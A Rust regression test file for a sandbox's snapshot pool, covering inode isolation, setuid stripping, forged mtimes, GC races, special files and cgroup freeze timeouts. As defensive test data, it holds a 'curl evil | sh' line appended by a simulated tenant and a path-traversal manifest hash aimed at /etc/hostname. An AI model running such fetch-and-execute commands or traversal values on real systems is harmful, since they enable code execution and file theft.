//! Regression tests for the content-addressed snapshot pool, special
//! files in snapshot / fork copies, and freeze-timeout rollback.
//!
//! Run with: cargo test --test snapshot_pool_test

use agentjail::{
    Jail, JailConfig, Snapshot, freeze_cgroup, gc_objects_pool_locked, load_manifest,
    snapshot_frozen,
};
use std::collections::HashSet;
use std::fs;
use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};
use std::time::Duration;

fn fresh(name: &str) -> PathBuf {
    let p = PathBuf::from(format!("/tmp/aj-snappool-{name}-{}", std::process::id()));
    let _ = fs::remove_dir_all(&p);
    p
}

fn blob_of(pool: &Path, hash: &str) -> PathBuf {
    pool.join(&hash[..2]).join(hash)
}

/// HIGH: restoring must never hard-link (or chmod) shared pool blobs.
/// A tenant writing / chmod-ing inside its restored tree must not change
/// the pool, other restored trees, or later restores.
#[test]
fn restore_never_shares_inodes_with_pool() {
    let out = fresh("iso-out");
    let snap = fresh("iso-snap");
    let pool = fresh("iso-pool");
    let r1 = fresh("iso-r1");
    let r2 = fresh("iso-r2");
    let r3 = fresh("iso-r3");
    fs::create_dir_all(out.join("bin")).unwrap();
    fs::write(out.join("data.txt"), "ORIGINAL").unwrap();
    fs::write(out.join("bin/tool"), "#!/bin/sh\necho hi\n").unwrap();
    fs::set_permissions(out.join("bin/tool"), fs::Permissions::from_mode(0o755)).unwrap();
    fs::set_permissions(out.join("data.txt"), fs::Permissions::from_mode(0o644)).unwrap();

    Snapshot::create_incremental(&out, &snap, &pool).unwrap();
    let m = load_manifest(&snap).unwrap();
    let data_hash = &m
        .entries
        .iter()
        .find(|e| e.path == "data.txt")
        .unwrap()
        .hash;
    let blob = blob_of(&pool, data_hash);
    let blob_meta_before = fs::metadata(&blob).unwrap();

    // Two tenants restore the same snapshot.
    Snapshot::restore_incremental(&snap, &pool, &r1).unwrap();
    Snapshot::restore_incremental(&snap, &pool, &r2).unwrap();

    let r1_meta = fs::metadata(r1.join("data.txt")).unwrap();
    assert_ne!(
        r1_meta.ino(),
        blob_meta_before.ino(),
        "restored file must be its own inode"
    );
    assert_eq!(
        fs::metadata(&blob).unwrap().nlink(),
        1,
        "blob must not be hard-linked"
    );
    assert_eq!(r1_meta.mode() & 0o777, 0o644, "mode replayed on the copy");
    assert_eq!(
        fs::metadata(r1.join("bin/tool")).unwrap().mode() & 0o777,
        0o755
    );

    // Tenant 1 scribbles over its copy and chmods it.
    fs::write(r1.join("data.txt"), "TENANT-1-WAS-HERE").unwrap();
    {
        use std::io::Write;
        let mut f = fs::OpenOptions::new()
            .append(true)
            .open(r1.join("bin/tool"))
            .unwrap();
        f.write_all(b"curl evil | sh\n").unwrap();
    }
    fs::set_permissions(r1.join("data.txt"), fs::Permissions::from_mode(0o4777)).unwrap();

    // Pool blob is untouched: bytes and mode.
    assert_eq!(fs::read_to_string(&blob).unwrap(), "ORIGINAL");
    let blob_meta_after = fs::metadata(&blob).unwrap();
    assert_eq!(
        blob_meta_after.mode(),
        blob_meta_before.mode(),
        "blob must never be chmod-ed"
    );
    // Tenant 2's tree is untouched.
    assert_eq!(fs::read_to_string(r2.join("data.txt")).unwrap(), "ORIGINAL");
    assert_eq!(
        fs::read_to_string(r2.join("bin/tool")).unwrap(),
        "#!/bin/sh\necho hi\n"
    );
    assert_eq!(
        fs::metadata(r2.join("data.txt")).unwrap().mode() & 0o7777,
        0o644
    );
    // A later restore is untouched.
    Snapshot::restore_incremental(&snap, &pool, &r3).unwrap();
    assert_eq!(fs::read_to_string(r3.join("data.txt")).unwrap(), "ORIGINAL");
    assert_eq!(
        fs::read_to_string(r3.join("bin/tool")).unwrap(),
        "#!/bin/sh\necho hi\n"
    );

    for p in [&out, &snap, &pool, &r1, &r2, &r3] {
        let _ = fs::remove_dir_all(p);
    }
}

/// setuid/setgid never survive a restore.
#[test]
fn restore_strips_setuid() {
    let out = fresh("suid-out");
    let snap = fresh("suid-snap");
    let pool = fresh("suid-pool");
    let r = fresh("suid-r");
    fs::create_dir_all(&out).unwrap();
    fs::write(out.join("x"), "x").unwrap();
    fs::set_permissions(out.join("x"), fs::Permissions::from_mode(0o6755)).unwrap();
    Snapshot::create_incremental(&out, &snap, &pool).unwrap();
    Snapshot::restore_incremental(&snap, &pool, &r).unwrap();
    assert_eq!(fs::metadata(r.join("x")).unwrap().mode() & 0o7777, 0o755);
    for p in [&out, &snap, &pool, &r] {
        let _ = fs::remove_dir_all(p);
    }
}

/// A forged manifest hash must not turn restore into a file read.
#[test]
fn restore_rejects_malformed_hash() {
    let snap = fresh("badhash-snap");
    let pool = fresh("badhash-pool");
    let r = fresh("badhash-r");
    fs::create_dir_all(&snap).unwrap();
    fs::create_dir_all(&pool).unwrap();
    fs::write(
        snap.join("manifest.json"),
        r#"{"version":2,"entries":[{"path":"stolen","mode":420,"hash":"../../../../etc/hostname","size":1}]}"#,
    )
    .unwrap();
    assert!(Snapshot::restore_incremental(&snap, &pool, &r).is_err());
    assert!(!r.join("stolen").exists());
    for p in [&snap, &pool, &r] {
        let _ = fs::remove_dir_all(p);
    }
}

fn restored_bytes(snap: &Path, pool: &Path, name: &str, file: &str) -> Vec<u8> {
    let r = fresh(name);
    Snapshot::restore_incremental(snap, pool, &r).unwrap();
    let b = fs::read(r.join(file)).unwrap();
    let _ = fs::remove_dir_all(&r);
    b
}

/// The fast path must not trust mtime: a jail can rewrite a file with the
/// same size and put the old mtime back (`touch -d`).
#[test]
fn fast_path_not_fooled_by_forged_mtime() {
    let out = fresh("mtime-out");
    let s1 = fresh("mtime-s1");
    let s2 = fresh("mtime-s2");
    let pool = fresh("mtime-pool");
    fs::create_dir_all(&out).unwrap();
    let f = out.join("f.txt");
    fs::write(&f, "AAAA").unwrap();
    // Let the file age past the racy-ctime window so its fast-path key
    // is actually recorded.
    std::thread::sleep(Duration::from_millis(2300));

    Snapshot::create_incremental(&out, &s1, &pool).unwrap();
    let m1 = load_manifest(&s1).unwrap();
    assert!(m1.entries[0].ctime_ns.is_some() && m1.entries[0].ino.is_some());

    let old_mtime = fs::metadata(&f).unwrap().modified().unwrap();
    fs::write(&f, "BBBB").unwrap(); // same size
    fs::File::options()
        .write(true)
        .open(&f)
        .unwrap()
        .set_modified(old_mtime)
        .unwrap();
    assert_eq!(fs::metadata(&f).unwrap().modified().unwrap(), old_mtime);

    Snapshot::create_incremental_with_hint(&out, &s2, &pool, Some(&m1)).unwrap();
    let m2 = load_manifest(&s2).unwrap();
    assert_ne!(m2.entries[0].hash, m1.entries[0].hash, "stale hash reused");
    assert_eq!(restored_bytes(&s2, &pool, "mtime-r", "f.txt"), b"BBBB");

    for p in [&out, &s1, &s2, &pool] {
        let _ = fs::remove_dir_all(p);
    }
}

/// Unchanged files still round-trip through the fast path correctly.
#[test]
fn fast_path_reuses_unchanged_file() {
    let out = fresh("fp-out");
    let s1 = fresh("fp-s1");
    let s2 = fresh("fp-s2");
    let pool = fresh("fp-pool");
    fs::create_dir_all(&out).unwrap();
    fs::write(out.join("same"), "SAME").unwrap();
    std::thread::sleep(Duration::from_millis(2300));
    Snapshot::create_incremental(&out, &s1, &pool).unwrap();
    let m1 = load_manifest(&s1).unwrap();
    Snapshot::create_incremental_with_hint(&out, &s2, &pool, Some(&m1)).unwrap();
    let m2 = load_manifest(&s2).unwrap();
    assert_eq!(m1.entries[0].hash, m2.entries[0].hash);
    assert_eq!(m1.entries[0].ctime_ns, m2.entries[0].ctime_ns);
    assert_eq!(restored_bytes(&s2, &pool, "fp-r", "same"), b"SAME");
    for p in [&out, &s1, &s2, &pool] {
        let _ = fs::remove_dir_all(p);
    }
}

/// A file being rewritten while it is snapshotted must never leave a
/// manifest whose fast-path key vouches for bytes it didn't hash: after
/// the writer stops, a hinted snapshot must capture the final bytes.
#[test]
fn concurrent_writes_never_produce_stale_fast_path() {
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};

    let out = fresh("race-out");
    let pool = fresh("race-pool");
    fs::create_dir_all(&out).unwrap();
    let f = out.join("hot.bin");
    let size = 4 * 1024 * 1024;
    fs::write(&f, vec![b'A'; size]).unwrap();

    let stop = Arc::new(AtomicBool::new(false));
    let writer = {
        let stop = stop.clone();
        let f = f.clone();
        std::thread::spawn(move || {
            use std::os::unix::fs::FileExt;
            let file = fs::OpenOptions::new().write(true).open(&f).unwrap();
            let mut fill = b'B';
            while !stop.load(Ordering::Relaxed) {
                file.write_all_at(&vec![fill; size], 0).unwrap();
                fill = if fill == b'Z' { b'B' } else { fill + 1 };
            }
        })
    };

    let mut prior = None;
    for i in 0..6 {
        let s = fresh(&format!("race-s{i}"));
        Snapshot::create_incremental_with_hint(&out, &s, &pool, prior.as_ref()).unwrap();
        prior = Some(load_manifest(&s).unwrap());
        let _ = fs::remove_dir_all(&s);
    }
    stop.store(true, Ordering::Relaxed);
    writer.join().unwrap();

    let last = fresh("race-last");
    Snapshot::create_incremental_with_hint(&out, &last, &pool, prior.as_ref()).unwrap();
    assert_eq!(
        restored_bytes(&last, &pool, "race-r", "hot.bin"),
        fs::read(&f).unwrap(),
        "hinted snapshot must capture the file's final bytes"
    );
    for p in [&out, &pool, &last] {
        let _ = fs::remove_dir_all(p);
    }
}

/// GC running concurrently with snapshot creation must never delete a
/// blob that a (now complete) manifest references.
#[test]
fn gc_never_deletes_inflight_blobs() {
    let out_root = fresh("gc-out");
    let snaps = fresh("gc-snaps");
    let pool = fresh("gc-pool");
    fs::create_dir_all(&snaps).unwrap();

    let collect = {
        let snaps = snaps.clone();
        move || -> agentjail::Result<HashSet<String>> {
            let mut refs = HashSet::new();
            for e in fs::read_dir(&snaps).map_err(agentjail::JailError::Snapshot)? {
                let e = e.map_err(agentjail::JailError::Snapshot)?;
                if let Ok(m) = load_manifest(&e.path()) {
                    refs.extend(m.referenced_blobs().map(str::to_string));
                }
            }
            Ok(refs)
        }
    };

    let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let gc = {
        let pool = pool.clone();
        let stop = stop.clone();
        let collect = collect.clone();
        std::thread::spawn(move || {
            let mut runs = 0u32;
            while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                gc_objects_pool_locked(&pool, collect.clone()).unwrap();
                runs += 1;
            }
            runs
        })
    };

    for i in 0..25 {
        // Unique bytes per round, so every snapshot writes new blobs.
        let out = out_root.join(format!("r{i}"));
        fs::create_dir_all(&out).unwrap();
        for j in 0..60 {
            fs::write(out.join(format!("f{j}")), format!("round {i} file {j}")).unwrap();
        }
        Snapshot::create_incremental(&out, &snaps.join(format!("s{i}")), &pool).unwrap();
    }
    stop.store(true, std::sync::atomic::Ordering::Relaxed);
    let runs = gc.join().unwrap();
    assert!(runs > 0);

    for i in 0..25 {
        let r = fresh(&format!("gc-r{i}"));
        Snapshot::restore_incremental(&snaps.join(format!("s{i}")), &pool, &r)
            .unwrap_or_else(|e| panic!("snapshot s{i} lost blobs to GC: {e}"));
        assert_eq!(
            fs::read_to_string(r.join("f7")).unwrap(),
            format!("round {i} file 7")
        );
        let _ = fs::remove_dir_all(&r);
    }
    // A final GC with every manifest referenced deletes nothing live.
    gc_objects_pool_locked(&pool, collect).unwrap();
    for p in [&out_root, &snaps, &pool] {
        let _ = fs::remove_dir_all(p);
    }
}

/// Sockets, FIFOs and symlinks in a jail's output must be skipped by
/// every copier, not make it fail (ENXIO) or hang (FIFO open).
#[test]
fn copies_skip_sockets_fifos_and_symlinks() {
    let out = fresh("special-out");
    fs::create_dir_all(out.join("sub")).unwrap();
    fs::write(out.join("sub/keep.txt"), "KEEP").unwrap();
    let _sock = std::os::unix::net::UnixListener::bind(out.join("app.sock")).unwrap();
    let fifo = std::ffi::CString::new(out.join("sub/pipe").to_str().unwrap()).unwrap();
    assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o644) }, 0);
    std::os::unix::fs::symlink("/etc/hostname", out.join("link")).unwrap();

    let (tx, rx) = std::sync::mpsc::channel();
    let out2 = out.clone();
    std::thread::spawn(move || {
        let full = fresh("special-full");
        let incr = fresh("special-incr");
        let pool = fresh("special-pool");
        let restored = fresh("special-restored");
        let forked = fresh("special-fork");
        let r = (|| -> agentjail::Result<()> {
            Snapshot::create(&out2, &full)?;
            Snapshot::create_incremental(&out2, &incr, &pool)?;
            Snapshot::restore_incremental(&incr, &pool, &restored)?;
            let jail = Jail::new(JailConfig {
                source: out2.clone(),
                output: out2.clone(),
                ..Default::default()
            })?;
            jail.live_fork(None, &forked)?;
            Ok(())
        })();
        tx.send((
            r.map_err(|e| e.to_string()),
            full,
            incr,
            pool,
            restored,
            forked,
        ))
        .unwrap();
    });
    let (r, full, incr, pool, restored, forked) = rx
        .recv_timeout(Duration::from_secs(20))
        .expect("snapshot hung on a special file (FIFO?)");
    r.expect("snapshotting a tree with special files must succeed");

    for dir in [&full, &restored, &forked] {
        assert_eq!(
            fs::read_to_string(dir.join("sub/keep.txt")).unwrap(),
            "KEEP"
        );
        for skipped in ["app.sock", "sub/pipe", "link"] {
            assert!(
                fs::symlink_metadata(dir.join(skipped)).is_err(),
                "{skipped} must be skipped in {}",
                dir.display()
            );
        }
    }
    let m = load_manifest(&incr).unwrap();
    let paths: Vec<_> = m.entries.iter().map(|e| e.path.as_str()).collect();
    assert_eq!(paths, ["sub/keep.txt"]);

    for p in [&out, &full, &incr, &pool, &restored, &forked] {
        let _ = fs::remove_dir_all(p);
    }
}

fn fake_unfreezable_cgroup(name: &str) -> PathBuf {
    let cg = fresh(name);
    fs::create_dir_all(&cg).unwrap();
    fs::write(cg.join("cgroup.freeze"), "0").unwrap();
    // The "kernel" never reports frozen 1.
    fs::write(cg.join("cgroup.events"), "populated 1\nfrozen 0\n").unwrap();
    cg
}

/// A freeze that times out must leave the cgroup thawed: callers treat
/// `Err` as "not frozen" and never thaw.
#[test]
fn freeze_timeout_leaves_cgroup_thawed() {
    let cg = fake_unfreezable_cgroup("freeze");
    assert!(freeze_cgroup(&cg).is_err());
    assert_eq!(
        fs::read_to_string(cg.join("cgroup.freeze")).unwrap().trim(),
        "0"
    );
    let _ = fs::remove_dir_all(&cg);
}

#[test]
fn snapshot_frozen_timeout_thaws_and_refuses_hot_copy() {
    let cg = fake_unfreezable_cgroup("sf");
    let out = fresh("sf-out");
    let snap = fresh("sf-snap");
    fs::create_dir_all(&out).unwrap();
    fs::write(out.join("a"), "A").unwrap();
    // A live cgroup that can't be frozen: no hot copy.
    assert!(snapshot_frozen(Some(&cg), &out, &snap).is_err());
    assert!(!snap.join("a").exists());
    assert_eq!(
        fs::read_to_string(cg.join("cgroup.freeze")).unwrap().trim(),
        "0"
    );
    for p in [&cg, &out, &snap] {
        let _ = fs::remove_dir_all(p);
    }
}
